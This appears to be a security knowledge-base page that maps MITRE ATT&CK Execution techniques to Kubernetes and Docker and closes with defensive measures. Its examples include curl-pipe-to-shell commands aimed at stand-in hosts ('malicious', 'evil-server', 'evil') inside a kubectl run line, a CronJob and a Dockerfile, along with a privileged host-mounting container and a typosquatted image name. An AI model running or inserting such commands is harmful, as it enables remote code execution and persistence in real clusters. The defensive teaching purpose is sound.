# Execution

## **Execution Techniques in Containerized Environments**

In Kubernetes and other containerized ecosystems, adversaries use Execution techniques to run code within the environment. This can involve legitimate container administration tools, injecting malicious workloads, or abusing cluster scheduling systems. Execution typically follows initial access and enables further actions like privilege escalation, persistence, and lateral movement.

***

### Container Administration Command **T1609**

**Description**:\
Use of legitimate container administrative tools (e.g., `docker`, `kubectl`, Kubernetes APIs) to execute commands inside containers or manage workloads.

**Container Example**:

* After gaining access to a compromised container or host, an attacker uses:

```bash
docker exec -it <container-id> /bin/bash
kubectl exec -it <pod-name> -- /bin/sh
```

* Abuse kubelet or CRI endpoints (`/exec`, `/run`) to spawn new processes without using `kubectl`.
* Download and execute malicious payloads inside live containers.

**Result**:\
Direct command execution within containers or pods, bypassing normal deployment workflows.

### Deploy Container **T1610**&#x20;

**Description**:\
Launch a new container to execute attacker-specified code, often with malicious configurations like mounted volumes, privileged flags, or custom environment variables.

**Container Example**:

* Use Kubernetes to run a malicious container:

```bash
kubectl run evil-pod --image=alpine --command -- /bin/sh -c "curl http://malicious/payload.sh | sh"
```

* Abuse Docker CLI to start a privileged container:

```bash
docker run -v /:/mnt --privileged attacker/image
```

* Inject malicious deployments using Helm charts, Argo CD pipelines, or compromised GitOps flows.

**Result**:\
Adversary-controlled containers are deployed in the environment, often disguised as legitimate workloads.

***

### Scheduled Task/Job T1053

**Description**

Adversaries may abuse scheduled task mechanisms to execute malicious code automatically at predefined times or intervals.\
In containerized environments, this often involves creating Kubernetes CronJobs or other orchestration-level scheduled tasks.

Using scheduled jobs allows attackers to persist after reboot, periodically beacon to C2 servers, pull new payloads, or maintain access without continuous interaction.\
Scheduling execution provides automation, covert operation windows, and resilience against remediation efforts.

#### **Result**

* Persistent execution of attacker-controlled code, surviving pod crashes or node reboots.
* Stealthier C2 communication or data exfiltration by using short-lived, periodic connections.
* Automated reinstallation of malware or backdoors after defender cleanup efforts.

### Container Orchestration Job **T1053.007**&#x20;

**Description**:\
Use Kubernetes-native scheduled workloads (CronJobs) to trigger recurring or delayed execution of malicious code.

**Container Example**:

* Deploy a Kubernetes CronJob to regularly pull down C2 commands or persistence scripts:

```yaml
yamlCopyEditapiVersion: batch/v1
kind: CronJob
metadata:
  name: recon-job
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: recon
            image: busybox
            command: ["/bin/sh", "-c", "curl http://evil-server/recon.sh | sh"]
          restartPolicy: OnFailure
```

**Result**:\
Persistent, scheduled execution even after pod or cluster restarts — ideal for maintaining backdoors or C2 communications.

***

### User Execution T1204.003

Adversaries rely on social engineering or human error to trick users or automated systems into executing malicious code.

In containerized environments, User Execution often involves:

* Tricking DevOps teams into pulling or running malicious container images.
* Injecting backdoored images into trusted registries.
* Abusing automation (e.g., CI/CD pipelines) to deploy compromised containers without immediate human review.

#### Malicious Image **T1204.003**&#x20;

**Description**:\
Trick users, developers, or automated systems into executing malicious container images through typosquatting, supply chain poisoning, or compromised registries.

**Container Example**:

* Upload a backdoored image to a public registry, disguised as a legitimate one:

```
Legit: nginx:latest
Evil: nqinx:latest
```

* Inject payloads into a popular base image (e.g., Python, Node.js) inside the `ENTRYPOINT`:

```dockerfile
FROM python:3.10
RUN curl http://evil/download.sh | sh
CMD ["python3"]
```

* Target build pipelines (e.g., GitHub Actions, GitLab CI) that pull unvalidated container images from external sources.

**Result**:\
Execution of attacker-controlled containers inside trusted environments, often without immediate detection.

***

### **Execution Techniques in Containerized Environments Summary**

| Technique/Subtechnique           | MITRE ID  | Container Example                                        |
| -------------------------------- | --------- | -------------------------------------------------------- |
| Container Administration Command | T1609     | Execute commands using `docker`, `kubectl`, kubelet APIs |
| Deploy Container                 | T1610     | Launch malicious containers via Kubernetes or Docker     |
| Container Orchestration Job      | T1053.007 | Create CronJobs for scheduled backdoor execution         |
| Malicious Image                  | T1204.003 | Trick users into running malicious container images      |

***

### Final Summary

Defending against Execution in containerized environments focuses on:

* **Restricting administrative command access** (e.g., securing kubelet, Docker APIs)
* **Validating container images and sources** (secure registries, signed images)
* **Auditing and restricting Kubernetes CronJob usage**
* **Monitoring for unexpected container deployments and executions**
